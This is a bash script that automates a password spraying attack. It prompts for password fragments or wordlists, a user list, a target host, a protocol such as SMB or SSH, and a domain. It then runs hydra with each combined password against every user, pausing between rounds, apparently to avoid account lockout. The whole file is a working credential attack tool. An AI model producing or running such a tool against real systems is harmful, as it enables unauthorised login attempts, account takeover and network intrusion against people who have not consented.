#!/bin/bash

# Get chunk1
read -p "Enter password chunk 1 (file or string): " CHUNK1_INPUT
if [[ -f "$CHUNK1_INPUT" ]]; then
  CHUNK1_TYPE="file"
else
  CHUNK1_TYPE="string"
fi

# Get chunk2
read -p "Enter password chunk 2 (file or string): " CHUNK2_INPUT
if [[ -f "$CHUNK2_INPUT" ]]; then
  CHUNK2_TYPE="file"
else
  CHUNK2_TYPE="string"
fi

# Other inputs
read -p "Enter special character to try (e.g., ! or leave blank): " SPECIAL
read -p "Enter user file (e.g., users.txt): " USERFILE
read -p "Enter target IP or hostname: " TARGET
read -p "Enter protocol (e.g., smb2, ssh): " PROTOCOL
read -p "Enter domain name (e.g., hiboxy): " DOMAIN_NAME
DOMAIN="workgroup:{$DOMAIN_NAME}"

read -p "Enter sleep time between attempts (in minutes): " SLEEP_MINUTES
SLEEP_SECONDS=$((SLEEP_MINUTES * 60))

# Preview example
if [[ "$CHUNK1_TYPE" == "file" ]]; then
  C1_PREVIEW=$(head -n1 "$CHUNK1_INPUT")
else
  C1_PREVIEW="$CHUNK1_INPUT"
fi

if [[ "$CHUNK2_TYPE" == "file" ]]; then
  C2_PREVIEW=$(head -n1 "$CHUNK2_INPUT")
else
  C2_PREVIEW="$CHUNK2_INPUT"
fi

echo "Example password 1: ${C1_PREVIEW}${C2_PREVIEW}"
echo "Example password 2: ${C1_PREVIEW}${C2_PREVIEW}${SPECIAL}"
read -p "Proceed with the spray attack? (y/n): " CONFIRM

[[ "$CONFIRM" != "y" ]] && echo "Aborted." && exit 1

# Build combinations
CHUNK1_VALUES=()
CHUNK2_VALUES=()

if [[ "$CHUNK1_TYPE" == "file" ]]; then
  mapfile -t CHUNK1_VALUES < "$CHUNK1_INPUT"
else
  CHUNK1_VALUES=("$CHUNK1_INPUT")
fi

if [[ "$CHUNK2_TYPE" == "file" ]]; then
  mapfile -t CHUNK2_VALUES < "$CHUNK2_INPUT"
else
  CHUNK2_VALUES=("$CHUNK2_INPUT")
fi

# Main loop
for c1 in "${CHUNK1_VALUES[@]}"; do
  for c2 in "${CHUNK2_VALUES[@]}"; do
    for suffix in "" "$SPECIAL"; do
      PASSWORD="${c1}${c2}${suffix}"
      echo "[*] Trying password: $PASSWORD"
      hydra -L "$USERFILE" -p "$PASSWORD" -m "$DOMAIN" "$TARGET" "$PROTOCOL"
      echo "[*] Sleeping $SLEEP_MINUTES minute(s)..."
      sleep "$SLEEP_SECONDS"
    done
  done
done
